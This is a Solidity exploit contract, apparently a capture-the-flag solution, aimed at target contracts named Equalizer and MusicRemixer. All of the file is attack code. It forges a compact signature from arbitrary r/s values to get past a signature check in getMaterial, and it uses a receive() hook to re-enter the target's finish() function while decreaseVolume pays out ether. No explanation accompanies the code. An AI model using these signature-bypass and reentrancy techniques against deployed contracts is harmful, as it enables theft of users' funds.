// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "./Equalizer.sol";
import "./MusicRemixer.sol";
import "@openzeppelin/contracts/interfaces/IERC20.sol";

contract Exploit {
    Equalizer equalizer;
    MusicRemixer remixer;

    uint private constant N = 3;
    uint variation_ = 0;

    constructor(address _equalizer, address _factory) {
        equalizer = Equalizer(_equalizer);
        remixer = MusicRemixer(_factory);
    }

    function setAllowances() external {
        IERC20 token = IERC20(address(equalizer.bands(1)));
        IERC20 token2 = IERC20(address(equalizer.bands(2)));
        token.approve(address(equalizer), 100 ether);
        token2.approve(address(equalizer), 100 ether);
    }

    function getTokens() external {
        uint8 v = 28;
        bytes32 r = hex"1337C0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DE1337";
        bytes32 s = hex"1337C0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DE1337";
        uint256 compactS = uint256(s);
        if (v == 28) {
            compactS |= (1 << 255);
        }
        bytes memory newSig = abi.encodePacked(r, bytes32(compactS));
        remixer.getMaterial(newSig);
    }

    function increaseVolume(uint[N] calldata amounts) public payable {
        variation_ = equalizer.increaseVolume{value: msg.value}(amounts);
    }

    function exploit() external {
        equalizer.decreaseVolume(variation_);
    }

    receive() external payable {
        remixer.finish();
    }
}
